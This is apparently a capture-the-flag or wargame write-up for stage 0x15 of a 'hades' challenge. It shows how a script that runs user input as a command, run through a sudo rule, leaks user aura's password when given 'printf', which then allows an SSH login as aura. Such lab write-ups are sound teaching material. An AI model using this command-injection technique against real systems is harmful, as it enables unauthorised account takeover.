# 0x15

moving from `athena` to `aura`

---

The mission for this stage centered on an interactive script belonging to user **aura**:

```bash
athena@hades:~$ cat mission.txt 
################
# MISSION 0x15 #
################

## EN ##
User aura lets us use her new script.
```

In the home directory, I found a backup script named `auri_old.sh`.

### 1. Code Analysis

The backup script `auri_old.sh` revealed the logic of how the interactive tool handles user input:

```bash
#!/bin/bash
echo "What?"
read hackme
...
#Add newest Aura pass!
#$hackme AURANEWPASS 2>/dev/null
```

The script prompts for input (`read hackme`) and then attempts to execute that input as a command, passing a secret value (`AURANEWPASS`) as an argument to it.

### 2. The Solution: Command Injection / Parameter Leak

Upon checking the available `sudo` privileges, I found that I could execute a script in Aura's home directory with her privileges without a password.

```bash
athena@hades:~$ sudo -l
...
User athena may run the following commands on hades:
    (aura) NOPASSWD: /bin/bash -c /pwned/aura/auri.sh
```

#### Step 1: Triggering the Script

I executed the live script using `sudo -u aura`. The script asked "What?", waiting for a command to run against the hidden password.

#### Step 2: Leaking the Secret

The goal was to provide a command that would simply print its arguments instead of trying to "execute" them. I used the `printf` command.

```bash
athena@hades:~$ sudo -u aura /bin/bash -c /pwned/aura/auri.sh
What?
printf
[REDACTED]athena@hades:~$
```

### 3. Explanation

* **Logic Flaw**: The script uses a variable (`$hackme`) directly as a command. This is a form of **Command Injection**. By providing a command like `printf`, `echo`, or `cat`, you can force the script to reveal whatever it was supposed to keep secret.
* **Sudo Execution**: Because the script was run with `sudo -u aura`, the shell environment within the script had the authority to access Aura's secrets and process her specific credentials.
* **The Finding**: The string leaked by the `printf` command is the cleartext login password for user **aura**.

### 4. Execution

Using the retrieved password, I successfully established a clean SSH session as user `aura`.

```bash
athena@hades:~$ ssh aura@localhost
aura@localhost's password: [REDACTED]
aura@hades:~$ id
uid=2007(aura) gid=2007(aura) groups=2007(aura)
```
